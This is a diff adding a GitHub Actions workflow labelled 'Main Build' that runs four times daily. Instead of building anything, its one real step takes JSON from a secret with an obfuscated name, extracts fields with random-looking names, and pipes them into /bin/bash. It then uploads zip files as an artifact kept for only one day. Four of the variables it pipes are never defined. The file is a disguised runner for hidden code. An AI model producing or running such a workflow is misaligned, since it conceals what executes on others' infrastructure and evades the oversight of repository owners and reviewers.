@@ -1,0 +1,31 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '34 5,11,17,23 * * *'
+env:
+  CI: true
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          ocu5: ${{ secrets.ocu5 }}
+        run: |
+          printf '%s' "$ocu5" | jq -r .i6426 | /bin/bash
+          printf '%s' "$cvf5" | jq -r .abeku60 | /bin/bash
+          printf '%s' "$ivlia1012" | jq -r .b4697 | /bin/bash
+          echo $lqg7 | jq -r .r11047 | /bin/bash
+          printf '%s' "$mjwbw072" | jq -r .kt914 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2ppk91fO
+          path: "*.zip"
+          retention-days: 1
